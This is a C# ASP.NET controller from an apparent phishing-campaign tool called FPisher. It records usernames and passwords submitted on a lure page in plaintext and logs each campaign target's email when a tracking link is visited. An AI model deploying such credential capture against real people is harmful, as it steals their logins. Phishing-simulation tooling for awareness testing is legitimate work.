using FPisher.Data;
using FPisher.Models;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Threading.Tasks;

namespace FPisher.Controllers
{
    public class Tracking : Controller
    {
        private readonly ApplicationDbContext _context;

        public Tracking(ApplicationDbContext context)
        {
            _context = context;
        }

        [HttpPost("/Home/testpage/RecordLogin")]
        public async Task<IActionResult> RecordLogin(string uname, string pass)
        {
            // Record the login credentials
            var login = new Login_records
            {
                uname = uname,
                pass = pass
            };

            _context.Login_Records.Add(login);
            await _context.SaveChangesAsync();

            // Optionally show a message on the same page
            ViewData["Message"] = "Login recorded successfully!";
            return View("TestPage");
        }


        //------------------------


        [HttpGet("/Tracking/testpage/{id}")]
        public async Task<IActionResult> TestPage(int id)
        {
          
            var campaign = await _context.Campaign_Records
                                         .FirstOrDefaultAsync(c => c.custom_link.EndsWith($"/{id}"));

            if (campaign == null)
            {
                return NotFound("Invalid tracking ID");
            }

            // Record the email in PageVisits table
            var visit = new PageVisits
            {
                Page_emails = campaign.Campaign_Emails
            };

            _context.Page_Visits.Add(visit);
            await _context.SaveChangesAsync();

            // Pass email to the view
            ViewData["Email"] = campaign.Campaign_Emails;

            // Explicitly specify the view path to avoid routing issues
            return View("~/Views/Tracking/TestPage.cshtml");
        }
    }
}
